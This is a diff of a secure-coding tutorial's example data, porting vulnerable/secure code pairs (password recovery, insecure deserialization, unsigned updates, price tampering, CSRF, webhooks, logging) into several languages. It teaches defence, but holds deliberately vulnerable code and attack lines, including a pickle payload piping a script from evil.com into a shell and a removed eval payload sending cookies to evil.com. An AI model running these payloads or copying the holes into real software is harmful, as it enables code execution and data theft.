-  const user = db.users.findByEmail(email);
+        vulnerableCode: `// Java — Vulnerable: Security questions for recovery
+@PostMapping("/api/recover")
+public ResponseEntity<?> recover(@RequestBody RecoverRequest req) {
+    User user = userRepository.findByEmail(req.getEmail());
 
-  if (!user) {
-    // Leaks whether the email exists!
-    return res.status(404).json({ error: 'Email not found.' });
-  }
+    if (user == null) {
+        // Leaks whether the email exists!
+        return ResponseEntity.status(404)
+            .body(Map.of("error", "Email not found."));
+    }
 
-  // Security questions are trivially guessable
-  if (user.mothersMaidenName === mothersMaidenName
-      && user.petName === petName) {
-    // Immediately resets password — no email verification!
-    const newPassword = 'TempPass123';
-    user.password = newPassword;
-    res.json({ newPassword });
-    // Sends the new password in the response! (plaintext)
-  }
-});
+    // Security questions are trivially guessable
+    if (user.getMothersMaidenName().equals(req.getMothersMaidenName())
+            && user.getPetName().equals(req.getPetName())) {
+        // Immediately resets — no email verification!
+        String newPassword = "TempPass123";
+        user.setPassword(newPassword);
+        userRepository.save(user);
+        return ResponseEntity.ok(
+            Map.of("newPassword", newPassword)
+        );
+        // Sends the new password in the response! (plaintext)
+    }
+    return ResponseEntity.status(400)
+        .body(Map.of("error", "Incorrect answers"));
+}
 
 // Problems:
 // 1. Security questions answerable from social media
-// 2. No email verification — attacker resets directly
+// 2. No email verification
 // 3. Reveals if email is registered (account enumeration)
-// 4. New password sent in response body (interceptable)`,
-        secureCode: `// Secure: Token-based recovery via email
-app.post('/api/recover', rateLimit({ max: 3, windowMs: 900000 }),
-  async (req, res) => {
-    const { email } = req.body;
-
+// 4. New password sent in response body`,
+        secureCode: `// Java — Secure: Token-based recovery via email
+@PostMapping("/api/recover")
+@RateLimiter(name = "recover")
+public ResponseEntity<?> recover(@RequestBody RecoverRequest req) {
     // Always return the same response (prevent enumeration)
-    res.json({ message: 'If registered, a reset link was sent.' });
+    ResponseEntity<?> response = ResponseEntity.ok(
+        Map.of("message", "If registered, a reset link was sent.")
+    );
 
-    const user = await db.users.findByEmail(email);
-    if (!user) return; // Don't reveal non-existence
+    User user = userRepository.findByEmail(req.getEmail());
+    if (user == null) return response;  // Don't reveal non-existence
 
     // Generate secure one-time token
-    const token = crypto.randomBytes(32).toString('hex');
-    await db.resetTokens.create({
-      userId: user.id,
-      tokenHash: await hashToken(token),
-      expiresAt: new Date(Date.now() + 900000), // 15 min
-      used: false
-    });
+    String token = UUID.randomUUID().toString();
 
-    // Send reset link to the registered email
-    await sendEmail(email, {
-      subject: 'Password Reset Request',
-      body: \`Click to reset: https://app.com/reset?token=\${token}
-             This link expires in 15 minutes.
-             If you didn't request this, ignore this email.\`
-    });
+    resetTokenRepository.save(new ResetToken(
+        user.getId(),
+        hashToken(token),
+        Instant.now().plusSeconds(900),  // 15 min
+        false  // not used yet
+    ));
+
+    emailService.send(req.getEmail(), new Email(
+        "Password Reset Request",
+        String.format(
+            "Click to reset: https://app.com/reset?token=%s\\n" +
+            "This link expires in 15 minutes.\\n" +
+            "If you didn't request this, ignore this email.",
+            token
+        )
+    ));
 
     // Log the recovery attempt
-    securityLogger.info({
-      event: 'PASSWORD_RESET_REQUESTED',
-      email: maskEmail(email)
-    });
-  }
-);`,
+    securityLogger.info("PASSWORD_RESET_REQUESTED email={}",
+        maskEmail(req.getEmail()));
+
+    return response;
+}`,
       },
     ],
   },
@@ -2127,137 +2429,155 @@ app.post('/api/recover', rateLimit({ max: 3, windowMs: 900000 }),
     },
     examples: [
       {
-        title: "Insecure Deserialization via eval()",
-        vulnerableCode: `// Vulnerable: Using eval() to deserialize data
-function loadUserProfile(serializedData) {
-  // DANGEROUS: eval() executes arbitrary code
-  const profile = eval('(' + serializedData + ')');
-  return profile;
-}
+        title: "Insecure Deserialization",
+        vulnerableCode: `# Python — Vulnerable: Using pickle to deserialize user data
+import pickle
+import base64
 
-// Normal input works fine:
-// loadUserProfile('{"name":"Alice","role":"user"}')
+@app.route('/api/load-profile', methods=['POST'])
+def load_profile():
+    # Receive serialized data from the client
+    data = request.form.get('profile_data')
+    decoded = base64.b64decode(data)
 
-// But an attacker sends:
-const malicious = \`{
-  name: (function(){
-    fetch('https://evil.com/steal?cookies='
-      + document.cookie);
-    return 'hacked';
-  })(),
-  role: "admin"
-}\`;
+    # DANGEROUS: pickle.loads() can execute arbitrary code!
+    profile = pickle.loads(decoded)
+    return jsonify(profile)
 
-const profile = loadUserProfile(malicious);
-// The function executes, cookies are stolen,
-// and the attacker gets admin access.`,
-        secureCode: `// Secure: JSON.parse + schema validation
-const PROFILE_SCHEMA = {
-  name:  { type: 'string', maxLength: 100 },
-  email: { type: 'string', maxLength: 254 },
-  role:  { type: 'string', enum: ['user', 'editor'] }
-};
+# Normal input works fine:
+# profile = {"name": "Alice", "role": "user"}
+# data = base64.b64encode(pickle.dumps(profile))
 
-function loadUserProfile(serializedData) {
-  let parsed;
-  try {
-    // JSON.parse is safe — it cannot execute code
-    parsed = JSON.parse(serializedData);
-  } catch (e) {
-    throw new Error('Invalid JSON format');
-  }
+# But an attacker crafts a malicious pickle payload:
+import os
 
-  const validated = {};
-  for (const [key, rules] of Object.entries(PROFILE_SCHEMA)) {
-    const value = parsed[key];
-    if (value === undefined) continue;
-    if (typeof value !== rules.type) {
-      throw new Error(\`Invalid type for \${key}\`);
-    }
-    if (rules.maxLength && value.length > rules.maxLength) {
-      throw new Error(\`\${key} exceeds max length\`);
-    }
-    if (rules.enum && !rules.enum.includes(value)) {
-      throw new Error(\`Invalid value for \${key}\`);
-    }
-    validated[key] = value;
-  }
+class Exploit:
+    def __reduce__(self):
+        # This runs os.system() when unpickled!
+        return (os.system, ('curl https://evil.com/shell.sh | sh',))
 
-  return validated;
-}`,
+# malicious = base64.b64encode(pickle.dumps(Exploit()))
+# POST /api/load-profile  profile_data=<malicious>
+# → Server executes the attacker's shell command!`,
+        secureCode: `# Python — Secure: JSON parsing + schema validation
+import json
+from marshmallow import Schema, fields, validate, ValidationError
+
+class ProfileSchema(Schema):
+    name = fields.Str(required=True, validate=validate.Length(max=100))
+    email = fields.Email(required=True)
+    role = fields.Str(
+        required=True,
+        validate=validate.OneOf(["user", "editor"])
+    )
+
+@app.route('/api/load-profile', methods=['POST'])
+def load_profile():
+    # Step 1: Parse as JSON (safe — cannot execute code)
+    try:
+        data = json.loads(request.data)
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON format"}), 400
+
+    # Step 2: Validate against strict schema
+    schema = ProfileSchema()
+    try:
+        validated = schema.load(data)
+    except ValidationError as err:
+        return jsonify({"error": err.messages}), 400
+
+    # Only validated, typed, safe data reaches here
+    return jsonify(validated)
+
+# NEVER use pickle, yaml.load(), or eval() for user data
+# ALWAYS use JSON + schema validation
+# Libraries: marshmallow, pydantic, cerberus, jsonschema`,
       },
       {
         title: "Auto-Update Without Signature Verification",
-        vulnerableCode: `// Vulnerable: Auto-update with no signature check
-async function checkForUpdate() {
-  const response = await fetch(
-    'https://updates.example.com/latest.json'
-  );
-  const update = await response.json();
+        vulnerableCode: `// Go — Vulnerable: Auto-update with no signature check
+package main
 
-  if (update.version > currentVersion) {
-    // Downloads and executes with no verification!
-    const binary = await fetch(update.downloadUrl);
-    const blob = await binary.blob();
-    installUpdate(blob);
-  }
+func checkForUpdate() error {
+    resp, err := http.Get(
+        "https://updates.example.com/latest.json",
+    )
+    if err != nil {
+        return err
+    }
+    defer resp.Body.Close()
+
+    var update struct {
+        Version     string \`json:"version"\`
+        DownloadURL string \`json:"downloadUrl"\`
+    }
+    json.NewDecoder(resp.Body).Decode(&update)
+
+    if update.Version > currentVersion {
+        // Downloads and executes with no verification!
+        binResp, _ := http.Get(update.DownloadURL)
+        binary, _ := io.ReadAll(binResp.Body)
+        os.WriteFile("/usr/local/bin/myapp", binary, 0755)
+        // Restart the application with the new binary
+        syscall.Exec("/usr/local/bin/myapp", os.Args, os.Environ())
+    }
+    return nil
 }
 
-// If the update server is compromised, or if an attacker
-// performs a MITM attack (DNS hijack, BGP hijack):
+// If the update server is compromised:
 // 1. Attacker serves malicious latest.json
 // 2. Points downloadUrl to malware
-// 3. App downloads and installs malware
-// 4. All users running auto-update are compromised
+// 3. App downloads, saves, and EXECUTES the malware
 // Real-world: SolarWinds Orion supply chain attack`,
-        secureCode: `// Secure: Signed updates with public key verification
-const PUBLIC_KEY = \`-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
------END PUBLIC KEY-----\`;
+        secureCode: `// Go — Secure: Signed updates with Ed25519 verification
+package main
 
-async function checkForUpdate() {
-  const response = await fetch(
-    'https://updates.example.com/latest.json'
-  );
-  const update = await response.json();
+import (
+    "crypto/ed25519"
+    "crypto/sha256"
+    "encoding/hex"
+)
 
-  if (update.version <= currentVersion) return;
+// Public key embedded in the application binary
+var publicKey ed25519.PublicKey = mustDecodeHex("a1b2c3d4...")
 
-  // Download the update AND its signature
-  const binary = await fetch(update.downloadUrl);
-  const signature = await fetch(update.signatureUrl);
+func checkForUpdate() error {
+    // Download update manifest
+    manifest, _ := fetchJSON("https://updates.example.com/latest.json")
 
-  const data = await binary.arrayBuffer();
-  const sig = await signature.arrayBuffer();
+    if manifest.Version <= currentVersion {
+        return nil
+    }
 
-  // Verify the signature using the embedded public key
-  const key = await crypto.subtle.importKey(
-    'spki', pemToBuffer(PUBLIC_KEY),
-    { name: 'RSA-PSS', hash: 'SHA-256' }, false, ['verify']
-  );
+    // Download the update AND its signature
+    binary, _ := fetchBytes(manifest.DownloadURL)
+    signature, _ := fetchBytes(manifest.SignatureURL)
 
-  const isValid = await crypto.subtle.verify(
-    { name: 'RSA-PSS', saltLength: 32 },
-    key, sig, data
-  );
+    // Step 1: Verify the Ed25519 signature
+    if !ed25519.Verify(publicKey, binary, signature) {
+        log.Error("UPDATE SIGNATURE INVALID — possible tampering!")
+        alertSecurityTeam("Update signature verification failed")
+        return fmt.Errorf("update verification failed")
+    }
 
-  if (!isValid) {
-    securityLogger.critical('Update signature invalid!');
-    throw new Error('Update verification failed');
-  }
+    // Step 2: Verify the SHA-256 hash matches the manifest
+    hash := sha256.Sum256(binary)
+    if hex.EncodeToString(hash[:]) != manifest.SHA256 {
+        return fmt.Errorf("hash mismatch")
+    }
 
-  // Also verify the hash matches what's in the manifest
-  const hash = await crypto.subtle.digest('SHA-256', data);
-  if (bufToHex(hash) !== update.sha256) {
-    throw new Error('Hash mismatch');
-  }
-
-  installUpdate(new Blob([data]));
+    // Step 3: Only now install the verified binary
+    log.Info("Update verified successfully, installing v%s",
+        manifest.Version)
+    os.WriteFile("/usr/local/bin/myapp", binary, 0755)
+    return nil
 }`,
       },
       {
         title: "Client-Side Price Tampering",
-        vulnerableCode: `// Vulnerable: Price stored in hidden form field / client state
+        vulnLang: "markup",
+        secureLang: "python",
+        vulnerableCode: `<!-- Vulnerable: Price stored in hidden form field -->
 <form action="/api/checkout" method="POST">
   <input type="hidden" name="productId" value="WIDGET-001">
   <input type="hidden" name="price" value="49.99">
@@ -2265,68 +2585,69 @@ async function checkForUpdate() {
   <button type="submit">Buy Now - $49.99</button>
 </form>
 
-// JavaScript cart:
-const cart = {
-  items: [
-    { id: 'WIDGET-001', name: 'Widget', price: 49.99, qty: 1 }
-  ],
-  total: 49.99
-};
+<script>
+  // JavaScript cart also trusts client-side prices:
+  const cart = {
+    items: [
+      { id: 'WIDGET-001', name: 'Widget', price: 49.99, qty: 1 }
+    ],
+    total: 49.99
+  };
 
-// Attacker opens DevTools and changes:
-// cart.items[0].price = 0.01
-// Or modifies the hidden input: value="0.01"
-// Or intercepts the POST request and changes price to 0.01
-//
-// Server trusts the client-submitted price: $0.01 charged.`,
-        secureCode: `// Secure: Server is the source of truth for pricing
-// Client sends only product ID and quantity
+  // Attacker opens DevTools and changes:
+  // cart.items[0].price = 0.01
+  // Or modifies the hidden input: value="0.01"
+  // Or intercepts the POST request and changes price to 0.01
+  //
+  // Server trusts the client-submitted price:
+  // $0.01 charged instead of $49.99!
+</script>`,
+        secureCode: `# Python Flask — Secure: Server is source of truth for pricing
 
-// Frontend:
-const cart = {
-  items: [
-    { id: 'WIDGET-001', qty: 1 }
-    // No price stored client-side!
-  ]
-};
+@app.route('/api/checkout', methods=['POST'])
+@login_required
+def checkout():
+    items = request.json.get('items', [])
+    total = 0
+    line_items = []
 
-async function checkout() {
-  const response = await fetch('/api/checkout', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      items: cart.items.map(i => ({
-        productId: i.id,
-        quantity: i.qty
-        // Price is NOT sent — server looks it up
-      }))
-    })
-  });
-  return response.json();
-}
+    for item in items:
+        # Client sends ONLY product ID and quantity
+        product = db.products.find_by_id(item['product_id'])
+        if not product:
+            return jsonify({"error": "Product not found"}), 400
 
-// Server:
-app.post('/api/checkout', authenticate, async (req, res) => {
-  let total = 0;
-  const lineItems = [];
+        quantity = int(item['quantity'])
+        if quantity < 1 or quantity > 100:
+            return jsonify({"error": "Invalid quantity"}), 400
 
-  for (const item of req.body.items) {
-    // Look up the REAL price from the database
-    const product = await db.products.findById(item.productId);
-    if (!product) throw new Error('Product not found');
+        # Look up the REAL price from the database
+        line_total = product.price * quantity
+        total += line_total
+        line_items.append({
+            "product": product.name,
+            "price": product.price,
+            "quantity": quantity,
+            "subtotal": line_total
+        })
 
-    const lineTotal = product.price * item.quantity;
-    total += lineTotal;
-    lineItems.push({ ...product, quantity: item.quantity });
-  }
+    # Charge the server-calculated total
+    charge = stripe.PaymentIntent.create(
+        amount=int(total * 100),  # Stripe uses cents
+        currency='usd',
+        metadata={'user_id': current_user.id}
+    )
 
-  // Charge the server-calculated total
-  const charge = await stripe.charges.create({ amount: total });
-  res.json({ orderId: charge.id, total });
-});`,
+    return jsonify({
+        "order_id": charge.id,
+        "total": total,
+        "items": line_items
+    })`,
       },
       {
         title: "Missing CSRF Protection",
+        vulnLang: "markup",
+        secureLang: "ruby",
         vulnerableCode: `<!-- Vulnerable: No CSRF token on state-changing forms -->
 <form action="https://bank.com/transfer" method="POST">
   <input name="to" value="alice">
@@ -2344,45 +2665,58 @@ app.post('/api/checkout', authenticate, async (req, res) => {
 <script>
   // Auto-submits the hidden form
   document.getElementById('csrfForm').submit();
+
   // User's browser sends their bank cookies automatically
   // The bank sees a valid authenticated request
   // $10,000 is transferred to the attacker
+
+  // The victim doesn't even see what happened —
+  // the form submits instantly when they visit evil.com
 </script>`,
-        secureCode: `// Secure: CSRF token + SameSite cookies
-// Server generates a unique CSRF token per session
-app.use((req, res, next) => {
-  if (!req.session.csrfToken) {
-    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
-  }
-  res.locals.csrfToken = req.session.csrfToken;
-  next();
-});
+        secureCode: `# Ruby on Rails — Secure: Built-in CSRF protection
+class ApplicationController < ActionController::Base
+  # Rails includes CSRF protection by default!
+  protect_from_forgery with: :exception
 
-// Template includes the token in every form:
-// <form action="/transfer" method="POST">
-//   <input type="hidden" name="_csrf"
-//          value="<%= csrfToken %>">
-//   ...
-// </form>
+  # Every form automatically includes a hidden CSRF token:
+  # <form action="/transfer" method="POST">
+  #   <input type="hidden" name="authenticity_token"
+  #          value="random-csrf-token-here">
+  #   ...
+  # </form>
+end
 
-// Middleware validates token on state-changing requests
-app.use((req, res, next) => {
-  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
-    const token = req.body._csrf || req.headers['x-csrf-token'];
-    if (token !== req.session.csrfToken) {
-      return res.status(403).json({ error: 'Invalid CSRF token' });
-    }
-  }
-  next();
-});
+class TransfersController < ApplicationController
+  def create
+    # Rails automatically verifies the CSRF token
+    # If token is missing or invalid → 422 Unprocessable Entity
 
-// Additionally: SameSite cookies prevent cross-origin sending
-// Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
-// The attacker's form at evil.com won't include the cookie.`,
+    @transfer = Transfer.new(transfer_params)
+    @transfer.user = current_user
+
+    if @transfer.save
+      render json: { message: "Transfer successful" }
+    else
+      render json: { error: @transfer.errors }, status: 400
+    end
+  end
+
+  private
+
+  def transfer_params
+    params.require(:transfer).permit(:to, :amount)
+  end
+end
+
+# The attacker's form at evil.com won't have the CSRF token
+# → Request is rejected with 422
+
+# Additionally: SameSite cookies prevent cross-origin sending
+# Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly`,
       },
       {
         title: "Unverified Webhook Payloads",
-        vulnerableCode: `// Vulnerable: Trusting webhook data without verification
+        vulnerableCode: `// Node.js — Vulnerable: Trusting webhook without verification
 app.post('/webhooks/payment', (req, res) => {
   const event = req.body;
 
@@ -2405,10 +2739,13 @@ app.post('/webhooks/payment', (req, res) => {
 
 // Attacker sends a fake webhook:
 // curl -X POST https://yoursite.com/webhooks/payment \\
+//   -H "Content-Type: application/json" \\
 //   -d '{"type":"payment.completed",
 //        "data":{"orderId":"ORD-123","amount":0}}'
-// Order marked as paid without any real payment!`,
-        secureCode: `// Secure: Verify webhook signature before processing
+//
+// Order marked as paid without any real payment!
+// Attacker gets free products.`,
+        secureCode: `// Node.js — Secure: Verify webhook signature
 const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET;
 
 app.post('/webhooks/payment',
@@ -2420,27 +2757,29 @@ app.post('/webhooks/payment',
     try {
       // Verify the signature using the shared secret
       event = stripe.webhooks.constructEvent(
-        req.body,        // Raw body (not parsed)
-        signature,       // Signature from headers
-        WEBHOOK_SECRET   // Your webhook secret
+        req.body,        // Raw body (not parsed JSON)
+        signature,       // Signature from Stripe headers
+        WEBHOOK_SECRET   // Your webhook signing secret
       );
     } catch (err) {
       securityLogger.warn({
         event: 'WEBHOOK_VERIFICATION_FAILED',
-        error: err.message
+        error: err.message,
+        ip: req.ip
       });
       return res.status(400).json({ error: 'Invalid signature' });
     }
 
     // Signature verified — safe to process
     if (event.type === 'payment_intent.succeeded') {
-      // Additional: verify the amount matches your records
-      const order = db.orders.findById(event.data.object.metadata.orderId);
+      const order = db.orders.findById(
+        event.data.object.metadata.orderId
+      );
+      // Also verify the amount matches your records
       if (order.total !== event.data.object.amount) {
         securityLogger.critical({ event: 'AMOUNT_MISMATCH' });
         return res.status(400).json({ error: 'Amount mismatch' });
       }
-
       db.orders.update(order.id, { status: 'paid' });
     }
 
@@ -2475,144 +2814,165 @@ app.post('/webhooks/payment',
     examples: [
       {
         title: "No Security Logging",
-        vulnerableCode: `// Vulnerable: No security logging at all
-function login(username, password) {
-  const user = users[username];
-  if (user && user.password === password) {
-    return { success: true };
-  }
-  // Failed login — no record, no alert, no trace
-  return { success: false };
+        vulnerableCode: `# Go — Vulnerable: No security logging at all
+package main
+
+func login(username, password string) bool {
+    user, err := db.FindUser(username)
+    if err != nil || !checkPassword(password, user.Hash) {
+        // Failed login — no record, no alert, no trace
+        return false
+    }
+    return true
 }
 
-function accessRecord(userId, recordId) {
-  // Sensitive data accessed — no audit log
-  return database.get(recordId);
+func accessRecord(userID string, recordID string) (*Record, error) {
+    // Sensitive data accessed — no audit log
+    return db.GetRecord(recordID)
 }
 
-function changePermissions(targetUser, newRole) {
-  // Privilege escalation — completely invisible
-  targetUser.role = newRole;
+func changePermissions(targetUser *User, newRole string) {
+    // Privilege escalation — completely invisible
+    targetUser.Role = newRole
+    db.Save(targetUser)
 }
 
 // An attacker can:
 // 1. Brute-force logins undetected
 // 2. Access sensitive data with no trail
 // 3. Escalate privileges silently
-// 4. Remain undetected for months (average: 204 days)`,
-        secureCode: `// Secure: Comprehensive logging + alerting
-const SecurityLogger = {
-  log(event) {
-    const entry = {
-      timestamp: new Date().toISOString(),
-      ...event,
-      sessionId: getSessionId(),
-      ip: getClientIP(),
-      userAgent: navigator.userAgent
-    };
-    auditLog.push(entry);
+// 4. Remain undetected for months
+//
+// Average time to detect a breach: 204 days (IBM 2023)
+// Without logs, you won't even know you were breached.`,
+        secureCode: `# Go — Secure: Structured logging with alerting
+package main
 
-    if (event.severity === 'HIGH' || event.severity === 'CRITICAL') {
-      triggerAlert(entry);
+import "go.uber.org/zap"
+
+var securityLog = zap.NewProduction()
+
+func login(username, password string) bool {
+    user, err := db.FindUser(username)
+    if err != nil || !checkPassword(password, user.Hash) {
+        securityLog.Warn("AUTH_FAILURE",
+            zap.String("user", username),
+            zap.String("ip", getClientIP()),
+            zap.String("user_agent", getUserAgent()),
+        )
+
+        // Check for brute force pattern
+        recentFailures := getRecentFailures(username)
+        if recentFailures >= 5 {
+            securityLog.Error("BRUTE_FORCE_DETECTED",
+                zap.String("user", username),
+                zap.Int("failures", recentFailures),
+            )
+            triggerAlert("Brute force attack", username)
+        }
+        return false
     }
-    return entry;
-  }
-};
 
-function login(username, password) {
-  const user = users[username];
-  if (user && user.password === password) {
-    SecurityLogger.log({
-      event: 'AUTH_SUCCESS', severity: 'INFO',
-      user: username
-    });
-    return { success: true };
-  }
+    securityLog.Info("AUTH_SUCCESS",
+        zap.String("user", username),
+        zap.String("ip", getClientIP()),
+    )
+    return true
+}
 
-  SecurityLogger.log({
-    event: 'AUTH_FAILURE', severity: 'WARN',
-    user: username, detail: 'Invalid credentials'
-  });
-
-  if (getRecentFailures(username) >= 5) {
-    SecurityLogger.log({
-      event: 'BRUTE_FORCE_DETECTED', severity: 'CRITICAL',
-      user: username
-    });
-  }
-  return { success: false };
+func accessRecord(userID, recordID string) (*Record, error) {
+    record, err := db.GetRecord(recordID)
+    securityLog.Info("DATA_ACCESS",
+        zap.String("user", userID),
+        zap.String("record", recordID),
+        zap.Bool("success", err == nil),
+    )
+    return record, err
 }`,
       },
       {
         title: "Logging Sensitive Data (Passwords, Tokens)",
-        vulnerableCode: `// Vulnerable: Logging sensitive information
-function login(req, res) {
-  const { email, password } = req.body;
+        vulnerableCode: `# Python — Vulnerable: Logging sensitive information
+import logging
 
-  // Logs the actual password!
-  logger.info('Login attempt', {
-    email: email,
-    password: password,    // NEVER log passwords!
-    headers: req.headers   // May contain auth tokens
-  });
+logger = logging.getLogger('app')
 
-  const user = authenticate(email, password);
-  if (user) {
-    const token = generateToken(user);
-    logger.info('Login successful', {
-      token: token,         // NEVER log session tokens!
-      user: user            // May include PII, password hash
-    });
-    res.json({ token });
-  }
-}
+def login(request):
+    email = request.json.get('email')
+    password = request.json.get('password')
 
-// Log file now contains:
-// {"email":"alice@co.com","password":"MySecret123!"}
-// {"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOi..."}
-// If logs are breached, ALL credentials are exposed.`,
-        secureCode: `// Secure: Structured logging without sensitive data
-function login(req, res) {
-  const { email, password } = req.body;
+    # Logs the actual password!
+    logger.info('Login attempt', extra={
+        'email': email,
+        'password': password,      # NEVER log passwords!
+        'headers': dict(request.headers)  # Contains auth tokens
+    })
 
-  // Log the event, not the credentials
-  logger.info('Login attempt', {
-    email: maskEmail(email),   // "a***@co.com"
-    ip: req.ip,
-    userAgent: req.headers['user-agent'],
-    timestamp: new Date().toISOString()
-    // NO password, NO token, NO full email
-  });
+    user = authenticate(email, password)
+    if user:
+        token = generate_token(user)
+        logger.info('Login successful', extra={
+            'token': token,        # NEVER log session tokens!
+            'user': vars(user)     # May include PII, password hash
+        })
+        return jsonify({'token': token})
 
-  const user = authenticate(email, password);
-  if (user) {
-    const token = generateToken(user);
-    logger.info('Login successful', {
-      userId: user.id,            // Internal ID only
-      email: maskEmail(email),
-      sessionCreated: true
-      // NO token value, NO user object
-    });
-    res.json({ token });
-  }
-}
+# Log file now contains:
+# {"email":"alice@co.com","password":"MySecret123!"}
+# {"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOi..."}
+# If logs are breached, ALL credentials are exposed.
+# Log aggregation services (Datadog, Splunk) store them too.`,
+        secureCode: `# Python — Secure: Structured logging without sensitive data
+import logging
 
-function maskEmail(email) {
-  const [local, domain] = email.split('@');
-  return local[0] + '***@' + domain;
-}
+logger = logging.getLogger('app')
 
-// Logs are safe even if breached:
-// {"email":"a***@co.com","ip":"1.2.3.4","sessionCreated":true}`,
+def mask_email(email):
+    local, domain = email.split('@')
+    return f"{local[0]}***@{domain}"
+
+def login(request):
+    email = request.json.get('email')
+    password = request.json.get('password')
+
+    # Log the EVENT, not the credentials
+    logger.info('Login attempt', extra={
+        'email': mask_email(email),  # "a***@co.com"
+        'ip': request.remote_addr,
+        'user_agent': request.headers.get('User-Agent'),
+        'timestamp': datetime.utcnow().isoformat()
+        # NO password, NO token, NO full email
+    })
+
+    user = authenticate(email, password)
+    if user:
+        token = generate_token(user)
+        logger.info('Login successful', extra={
+            'user_id': user.id,            # Internal ID only
+            'email': mask_email(email),
+            'session_created': True
+            # NO token value, NO user object
+        })
+        return jsonify({'token': token})
+
+# Logs are safe even if breached:
+# {"email":"a***@co.com","ip":"1.2.3.4","session_created":true}`,
       },
       {
         title: "No Log Integrity Protection",
-        vulnerableCode: `// Vulnerable: Logs stored as plain text files
-const fs = require('fs');
+        vulnerableCode: `// Java — Vulnerable: Logs stored as plain text files
+public class AuditLogger {
+    private static final String LOG_FILE =
+        "/var/log/app/security.log";
 
-function logEvent(event) {
-  const line = JSON.stringify(event) + '\\n';
-  fs.appendFileSync('/var/log/app/security.log', line);
+    public static void log(Map<String, Object> event) {
+        String line = new ObjectMapper()
+            .writeValueAsString(event) + "\\n";
+        Files.writeString(
+            Path.of(LOG_FILE), line,
+            StandardOpenOption.APPEND
+        );
+    }
 }
 
 // Problems:
@@ -2630,45 +2990,42 @@ function logEvent(event) {
 //
 // 5. No timestamps from a trusted source
 //    Attacker can backdate events`,
-        secureCode: `// Secure: Tamper-evident, append-only remote logging
-const crypto = require('crypto');
+        secureCode: `// Java — Secure: Tamper-evident, append-only remote logging
+public class SecureAuditLogger {
+    private String previousHash = "0".repeat(64);
+    private final SIEMClient siem;
+    private final S3Client s3;
 
-class SecureLogger {
-  constructor() {
-    this.previousHash = '0'.repeat(64);
-  }
+    public void log(Map<String, Object> event) {
+        // Add metadata
+        event.put("timestamp", Instant.now().toString());
+        event.put("sequence", nextSequence());
+        event.put("previousHash", previousHash);
 
-  log(event) {
-    const entry = {
-      ...event,
-      timestamp: new Date().toISOString(),
-      sequence: this.sequence++,
-      // Chain hash: links each entry to the previous one
-      previousHash: this.previousHash
-    };
+        // Chain hash: links each entry to the previous one
+        String json = objectMapper.writeValueAsString(event);
+        String hash = sha256(json);
+        event.put("hash", hash);
+        previousHash = hash;
 
-    // Hash this entry (includes previous hash → chain)
-    entry.hash = crypto.createHash('sha256')
-      .update(JSON.stringify(entry))
-      .digest('hex');
-    this.previousHash = entry.hash;
+        // Write to MULTIPLE destinations simultaneously
+        // 1. Local (fast, may be compromised)
+        localLogger.write(event);
 
-    // Write to multiple destinations simultaneously
-    // 1. Local (fast, may be compromised)
-    localLogger.write(entry);
+        // 2. Remote SIEM (append-only, separate permissions)
+        siem.send(event);
 
-    // 2. Remote SIEM (append-only, separate permissions)
-    siem.send(entry);
-
-    // 3. Immutable storage (S3 with Object Lock)
-    s3.putObject({
-      Bucket: 'audit-logs',
-      Key: \`\${entry.timestamp}-\${entry.hash}.json\`,
-      Body: JSON.stringify(entry),
-      ObjectLockMode: 'COMPLIANCE',
-      ObjectLockRetainUntilDate: retentionDate(365)
-    });
-  }
+        // 3. Immutable storage (S3 with Object Lock)
+        s3.putObject(PutObjectRequest.builder()
+            .bucket("audit-logs")
+            .key(event.get("timestamp") + "-" + hash + ".json")
+            .objectLockMode(ObjectLockMode.COMPLIANCE)
+            .objectLockRetainUntilDate(
+                Instant.now().plus(365, ChronoUnit.DAYS))
+            .build(),
+            RequestBody.fromString(json)
+        );
+    }
 }
 
 // If an attacker modifies any entry, the hash chain breaks.
@@ -2676,80 +3033,87 @@ class SecureLogger {
       },
       {
         title: "Missing Alert Thresholds",
-        vulnerableCode: `// Vulnerable: Logs exist but nobody watches them
-function securityLog(event) {
-  // Writes to a log file and... that's it
-  console.log(JSON.stringify(event));
-  fs.appendFileSync('security.log', JSON.stringify(event));
-}
+        vulnerableCode: `# Ruby — Vulnerable: Logs exist but nobody watches them
+def security_log(event)
+  # Writes to a log file and... that's it
+  puts event.to_json
+  File.open("security.log", "a") { |f| f.puts event.to_json }
+end
 
-// These events are logged but never trigger alerts:
-securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
-securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
-securityLog({ event: 'LOGIN_FAILURE', user: 'admin' });
-// ... 10,000 more failures — nobody notices
+# These events are logged but never trigger alerts:
+security_log({ event: "LOGIN_FAILURE", user: "admin" })
+security_log({ event: "LOGIN_FAILURE", user: "admin" })
+security_log({ event: "LOGIN_FAILURE", user: "admin" })
+# ... 10,000 more failures — nobody notices
 
-securityLog({ event: 'PERMISSION_CHANGE', role: 'admin' });
-// A user granted themselves admin — no alert
+security_log({ event: "PERMISSION_CHANGE", role: "admin" })
+# A user granted themselves admin — no alert
 
-securityLog({ event: 'DATA_EXPORT', records: 50000 });
-// 50,000 records exported — no alert
+security_log({ event: "DATA_EXPORT", records: 50000 })
+# 50,000 records exported — no alert
 
-// Average time to detect a breach: 204 days (IBM 2023)
-// Logs without alerting are forensic evidence at best
-// — too late to prevent the damage.`,
-        secureCode: `// Secure: Automated alert rules with escalation
-const alertRules = [
-  {
-    name: 'Brute Force Detection',
-    condition: (events) =>
-      events.filter(e => e.event === 'LOGIN_FAILURE'
-        && e.timestamp > fiveMinutesAgo()
-      ).length >= 5,
-    severity: 'HIGH',
-    action: 'lockAccount'
-  },
-  {
-    name: 'Privilege Escalation',
-    condition: (events) =>
-      events.some(e => e.event === 'PERMISSION_CHANGE'
-        && e.newRole === 'admin'),
-    severity: 'CRITICAL',
-    action: 'notifySOC'
-  },
-  {
-    name: 'Mass Data Export',
-    condition: (events) =>
-      events.some(e => e.event === 'DATA_EXPORT'
